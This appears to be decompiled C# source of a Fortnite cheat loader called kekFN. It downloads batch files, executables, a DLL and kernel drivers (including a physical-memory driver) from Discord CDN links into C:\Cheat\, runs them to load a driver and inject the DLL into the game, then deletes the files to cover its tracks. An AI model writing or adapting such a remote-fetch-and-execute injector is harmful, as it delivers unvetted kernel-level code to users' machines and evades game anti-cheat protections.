using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace kekFN
{
	// Token: 0x02000002 RID: 2
	internal class Class1
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static void inj()
		{
			Console.ForegroundColor = ConsoleColor.Cyan;
			WebClient webClient = new WebClient();
			Directory.CreateDirectory("C:\\Cheat\\");
			string text = "C:\\Cheat\\prflog.bat";
			string text2 = "C:\\Cheat\\inject.bat";
			string text3 = "C:\\Cheat\\prflog_cfg.exe";
			string text4 = "C:\\Cheat\\smap.exe";
			string text5 = "C:\\Cheat\\kekFN.dll";
			string text6 = "C:\\Cheat\\Driver.sys";
			string fileName = "C:\\Cheat\\prflog64.sys";
			string fileName2 = "C:\\Cheat\\phymem64.sys";
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034478363508736/prflog.bat", text);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034475784404992/inject.bat", text2);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034479849209866/prflog_cfg.exe", text3);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034487558078464/smap.exe", text4);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784030760248147978/kekFN.dll", text5);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034475654381588/Driver.sys", text6);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034480079241216/prflog64.sys", fileName);
			webClient.DownloadFile("https://cdn.discordapp.com/attachments/777480878296662039/784034476740444160/phymem64.sys", fileName2);
			Process process = new Process();
			Thread.Sleep(3000);
			process.Close();
			Console.Clear();
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("                                                          ");
			Console.WriteLine("  /$$   /$$ /$$$$$$$$ /$$   /$$       /$$$$$$$$ /$$   /$$");
			Console.WriteLine(" | $$  /$$/| $$_____/| $$  /$$/      | $$_____/| $$$ | $$");
			Console.WriteLine(" | $$ /$$/ | $$      | $$ /$$/       | $$      | $$$$| $$");
			Console.WriteLine(" | $$$$$/  | $$$$$   | $$$$$/        | $$$$$   | $$ $$ $$");
			Console.WriteLine(" | $$  $$  | $$__/   | $$  $$        | $$__/   | $$  $$$$");
			Console.WriteLine(" | $$\\  $$ | $$      | $$\\  $$       | $$      | $$\\  $$$");
			Console.WriteLine(" | $$ \\  $$| $$$$$$$$| $$ \\  $$      | $$      | $$ \\  $$");
			Console.WriteLine(" |__/  \\__/|________/|__/  \\__/      |__/      |__/  \\__/");
			Console.WriteLine("                                                          ");
			Console.ForegroundColor = ConsoleColor.Red;
			Class2.Print("\n [+] Press Enter to run Driver", 40);
			Console.ReadLine();
			Console.ForegroundColor = ConsoleColor.White;
			Process.Start(text);
			Thread.Sleep(6000);
			Console.Clear();
			Console.WriteLine("                                                          ");
			Console.WriteLine("  /$$   /$$ /$$$$$$$$ /$$   /$$       /$$$$$$$$ /$$   /$$");
			Console.WriteLine(" | $$  /$$/| $$_____/| $$  /$$/      | $$_____/| $$$ | $$");
			Console.WriteLine(" | $$ /$$/ | $$      | $$ /$$/       | $$      | $$$$| $$");
			Console.WriteLine(" | $$$$$/  | $$$$$   | $$$$$/        | $$$$$   | $$ $$ $$");
			Console.WriteLine(" | $$  $$  | $$__/   | $$  $$        | $$__/   | $$  $$$$");
			Console.WriteLine(" | $$\\  $$ | $$      | $$\\  $$       | $$      | $$\\  $$$");
			Console.WriteLine(" | $$ \\  $$| $$$$$$$$| $$ \\  $$      | $$      | $$ \\  $$");
			Console.WriteLine(" |__/  \\__/|________/|__/  \\__/      |__/      |__/  \\__/");
			Console.WriteLine("                                                          ");
			Console.ForegroundColor = ConsoleColor.Red;
			Class2.Print("\n [+] Open Fortnite", 40);
			Class2.Print("\n [+] Press Enter In Lobby", 40);
			Console.ReadLine();
			Process.Start(text2);
			Thread.Sleep(4000);
			Console.Clear();
			Console.WriteLine("                                                          ");
			Console.WriteLine("  /$$   /$$ /$$$$$$$$ /$$   /$$       /$$$$$$$$ /$$   /$$");
			Console.WriteLine(" | $$  /$$/| $$_____/| $$  /$$/      | $$_____/| $$$ | $$");
			Console.WriteLine(" | $$ /$$/ | $$      | $$ /$$/       | $$      | $$$$| $$");
			Console.WriteLine(" | $$$$$/  | $$$$$   | $$$$$/        | $$$$$   | $$ $$ $$");
			Console.WriteLine(" | $$  $$  | $$__/   | $$  $$        | $$__/   | $$  $$$$");
			Console.WriteLine(" | $$\\  $$ | $$      | $$\\  $$       | $$      | $$\\  $$$");
			Console.WriteLine(" | $$ \\  $$| $$$$$$$$| $$ \\  $$      | $$      | $$ \\  $$");
			Console.WriteLine(" |__/  \\__/|________/|__/  \\__/      |__/      |__/  \\__/");
			Console.WriteLine("                                                          ");
			File.Delete(text);
			File.Delete(text2);
			File.Delete(text3);
			File.Delete(text4);
			File.Delete(text5);
			File.Delete(text6);
		}
	}
}
